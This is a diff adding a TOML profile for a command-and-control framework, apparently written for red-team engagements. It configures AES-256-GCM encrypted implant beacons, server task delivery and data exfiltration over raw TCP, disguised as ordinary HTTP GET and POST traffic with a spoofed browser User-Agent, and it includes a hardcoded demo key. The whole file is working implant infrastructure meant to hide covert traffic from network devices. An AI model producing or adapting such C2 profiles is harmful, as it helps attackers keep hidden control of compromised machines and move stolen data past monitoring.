@@ -1,0 +1,106 @@
+[profile]
+name = "Encrypted HTTP Mimicry"
+author = "LongHaul Team"
+
+# ==========================================================================
+# RAW - Encrypted HTTP/1.1 Protocol Mimicry (TCP)
+# ==========================================================================
+#
+# This profile is identical to raw_http_profile.toml but adds AES-256-GCM
+# encryption (symcrypt) as the first transform in every chain. The payload
+# is encrypted before base64 encoding, so the wire traffic still looks like
+# valid HTTP to network devices — only the base64 body is ciphertext instead
+# of plaintext msgpack.
+#
+# Body template scope:
+#   Transforms apply ONLY to the token value (<METADATA>, <OUTPUT>).
+#   The HTTP framing (GET /update?sid=..., headers, etc.) stays plaintext.
+#   This is by design — protocol framing must remain readable for mimicry,
+#   while the actual C2 data within is encrypted.
+#
+# Key management:
+#   The same 32-byte key below is compiled into the implant binary and
+#   used by the server to decrypt/encrypt. Generate a unique key per
+#   engagement — do NOT reuse this demo key in production.
+#
+# Transform chain order:
+#   1. symcrypt (encrypt raw msgpack)
+#   2. base64url (encode ciphertext to printable ASCII)
+#   3. prepend/append (add HTTP framing)
+#
+# Wire format — client to server:
+#
+#   GET (beacon):
+#     GET /update?sid=<base64url(AES-GCM(msgpack))> HTTP/1.1\r\n
+#     Host: example.com\r\n
+#     ...headers...\r\n
+#     \r\n
+#
+#   POST (exfil):
+#     POST /upload HTTP/1.1\r\n
+#     ...headers...\r\n
+#     \r\n
+#     data=<base64url(AES-GCM(msgpack))>
+#
+# Disambiguation:
+#   Same as raw_http_profile.toml — GET starts with "GET " (0x47),
+#   POST starts with "POST" (0x50). Encryption is inside the base64
+#   body, not in the framing, so prefix routing is unaffected.
+# ==========================================================================
+
+
+# --------------------------------------------------------------------------
+# GET — Beacon check-in (implant → server)
+# --------------------------------------------------------------------------
+[raw.get]
+proto = "tcp"
+body = "<METADATA>"
+
+[raw.get.client.metadata]
+# Transform chain:
+#   1. AES-256-GCM encrypt the raw msgpack metadata
+#   2. base64url-encode the ciphertext
+#   3. prepend "GET /update?sid="
+#   4. append HTTP headers
+transforms = [
+    { op = "symcrypt", key = '\x6B\x4A\x79\xF6\xD6\xDF\x9B\xD5\x95\x5E\xD8\xFA\xC4\x84\x65\x3E\x1C\xF4\xAF\x5B\x4E\x42\x10\xB4\x78\x64\xDE\x87\x82\xCD\xA1\xC2' },
+    { op = "base64url" },
+    { op = "prepend", val = 'GET /update?sid=' },
+    { op = "append",  val = ' HTTP/1.1\x0D\x0AHost: example.com\x0D\x0AUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\x0D\x0AAccept: */*\x0D\x0AConnection: close\x0D\x0A\x0D\x0A' },
+]
+
+[raw.get.server]
+body = "<OUTPUT>"
+
+[raw.get.server.output]
+# Transform chain for server → implant task delivery:
+#   1. AES-256-GCM encrypt the task bytes
+#   2. base64url-encode
+#   3. prepend HTTP 200 response headers
+transforms = [
+    { op = "symcrypt", key = '\x6B\x4A\x79\xF6\xD6\xDF\x9B\xD5\x95\x5E\xD8\xFA\xC4\x84\x65\x3E\x1C\xF4\xAF\x5B\x4E\x42\x10\xB4\x78\x64\xDE\x87\x82\xCD\xA1\xC2' },
+    { op = "base64url" },
+    { op = "prepend", val = 'HTTP/1.1 200 OK\x0D\x0AContent-Type: application/octet-stream\x0D\x0A\x0D\x0A' },
+]
+
+
+# --------------------------------------------------------------------------
+# POST — Task exfil (implant → server)
+# --------------------------------------------------------------------------
+[raw.post]
+proto = "tcp"
+body = "<OUTPUT>"
+
+[raw.post.client.output]
+# Transform chain:
+#   1. AES-256-GCM encrypt the msgpack exfil payload
+#   2. base64url-encode the ciphertext
+#   3. prepend HTTP POST headers + body field name
+transforms = [
+    { op = "symcrypt", key = '\x6B\x4A\x79\xF6\xD6\xDF\x9B\xD5\x95\x5E\xD8\xFA\xC4\x84\x65\x3E\x1C\xF4\xAF\x5B\x4E\x42\x10\xB4\x78\x64\xDE\x87\x82\xCD\xA1\xC2' },
+    { op = "base64url" },
+    { op = "prepend", val = 'POST /upload HTTP/1.1\x0D\x0AHost: example.com\x0D\x0AUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\x0D\x0AContent-Type: application/x-www-form-urlencoded\x0D\x0A\x0D\x0Adata=' },
+]
+
+[raw.post.server]
+body = "HTTP/1.1 200 OK\r\n\r\n"
